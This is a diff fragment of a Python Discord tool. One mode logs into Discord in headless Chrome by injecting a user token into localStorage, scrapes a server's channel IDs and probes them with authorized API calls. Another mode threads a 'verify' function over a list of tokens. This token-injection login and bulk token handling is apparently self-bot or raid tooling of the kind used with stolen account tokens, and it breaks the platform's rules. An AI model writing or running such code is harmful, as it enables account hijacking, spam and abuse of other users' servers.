-        document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage.token = `"{token}"`
-        }}, 50);
-        setTimeout(() => {{
-        location.reload();
-        }}, 2500);
-    }}
-    login("{token}");
-    """)
-
-
-    time.sleep(7)
-    success('Logged into Discord')
-    driver.get(f'https://discord.com/channels/{server}/')
-    driver.execute_script("document.body.style.zoom = '4%';")
-    time.sleep(8)
-    
-    with open('webpage.html', 'w', encoding='utf-8') as file:
-        file.write(driver.page_source)
-    with open('webpage.html', 'r', encoding='utf-8') as file:
-        html_content = file.read()
-        links = re.findall(r'channels___\d{18,21}', html_content)
-    info('Saved html')
-    driver.quit()
-    ids = []
-    for link in links:
+        threads=[]
+        tinput('Press enter to stop')
+        time.sleep(1)
+        for token in tokens:
+            t = threading.Thread(target=verify, args=(token.strip('\n'),))
+            t.start()
+            threads.append(t)
+        #make all threads stop
         
-        id = re.search(r'\d{18,21}', link).group()
-        success(f'Found ID:{id}')
-        ids.append(id)
-    valid = []
-    print('Checking IDs if Valid')
-    for number in ids:
-        check = requests.post(f'https://discord.com/api/v9/channels/{number}/messages',data={'content': ' '},headers={"authorization": token})
-        if '50006' in check.text:
-            success(f'ID:{number} Is a Text Channel')
-            valid.append(number)
-            with open('Channels.txt','a')as g:
-                g.write(number + '\n')
-        elif '50008' in check.text:
-            warning(f'ID:{number} Is not a Text Channel')
-        elif '50013'in check.text:
-            warning(f'ID:{number} Missing Permissions')
-        else:
-            error(f'ID:{number} Does not exitst'  + check.text)
-    valid_str = str(valid)
-    valid2 = valid_str.strip('[').strip(']').replace("'",'')
-    print(valid2)   
+        for thread in threads:
+            thread.join()
+
+
+        
+
+    if mode == '6':
+        token = tinput('Token:')
+        server = tinput('Server ID:')
+        options = webdriver.ChromeOptions()
+        options.add_argument('--headless')
+        options.add_argument('--disable-gpu')
+        options.add_experimental_option('excludeSwitches', ['enable-logging'])
+        driver = webdriver.Chrome(options=options,service=ChromeService(ChromeDriverManager().install()))
+        driver.get('https://discord.com/login')
+
+
+
+        info('Logging into discord')
+        wait = WebDriverWait(driver, 10) 
+        element = wait.until(EC.presence_of_element_located((By.XPATH, '/html/body/div[2]/div[2]/div[1]/div[1]/div/div/div/div/form/div[2]/div/div[1]')))
+
+        driver.execute_script(f"""
+        function login(token) {{
+            setInterval(() => {{
+            document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage.token = `"{token}"`
+            }}, 50);
+            setTimeout(() => {{
+            location.reload();
+            }}, 2500);
+        }}
+        login("{token}");
+        """)
+
+
+        time.sleep(7)
+        success('Logged into Discord')
+        driver.get(f'https://discord.com/channels/{server}/')
+        driver.execute_script("document.body.style.zoom = '4%';")
+        time.sleep(8)
+        
+        with open('webpage.html', 'w', encoding='utf-8') as file:
+            file.write(driver.page_source)
+        with open('webpage.html', 'r', encoding='utf-8') as file:
+            html_content = file.read()
+            links = re.findall(r'channels___\d{18,21}', html_content)
+        info('Saved html')
+        driver.quit()
+        ids = []
+        for link in links:
+            
+            id = re.search(r'\d{18,21}', link).group()
+            success(f'Found ID:{id}')
+            ids.append(id)
+        valid = []
+        print('Checking IDs if Valid')
+        for number in ids:
+            check = requests.post(f'https://discord.com/api/v9/channels/{number}/messages',data={'content': ' '},headers={"authorization": token})
+            if '50006' in check.text:
+                success(f'ID:{number} Is a Text Channel')
+                valid.append(number)
+                with open('Channels.txt','a')as g:
+                    g.write(number + '\n')
+            elif '50008' in check.text:
+                warning(f'ID:{number} Is not a Text Channel')
+            elif '50013'in check.text:
+                warning(f'ID:{number} Missing Permissions')
+            else:
+                error(f'ID:{number} Does not exitst'  + check.text)
+        valid_str = str(valid)
+        valid2 = valid_str.strip('[').strip(']').replace("'",'')
+        print(valid2)
+    
+
+
+
+    if mode == '7':
+        print('Just kidding this is just a joke mode ')
+        time.sleep(2)
+
+    cls()
+
+if __name__ == "__main__":
+    while True:
+        main()
